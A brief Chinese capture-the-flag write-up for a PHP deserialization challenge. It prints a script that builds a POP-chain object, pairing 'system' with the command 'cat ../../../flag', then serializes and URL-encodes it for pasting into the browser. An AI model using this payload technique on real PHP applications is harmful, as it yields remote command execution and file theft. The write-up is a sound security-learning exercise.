---
title: "垫刀之路06_pop base mini moe"
date: 2024-09-01
---
# 垫刀之路06: pop base mini moe

```php
<?php
class A {
    private $evil;
    private $a;

    function __construct($evil, $a) {
        $this->evil = $evil;
        $this->a = $a;
    }
}

class B {
    private $b;

    function __construct($b) {
        $this->b = $b;
    }
}

$b = new B('system');
$a = new A('cat ../../../flag', $b);

$serialized = serialize($a);
echo $serialized;
echo PHP_EOL;//换行
$url = urlencode($serialized);
echo $url;
?>
```

把$url的值复制到浏览器地址栏，然后按下回车，即可看到flag。
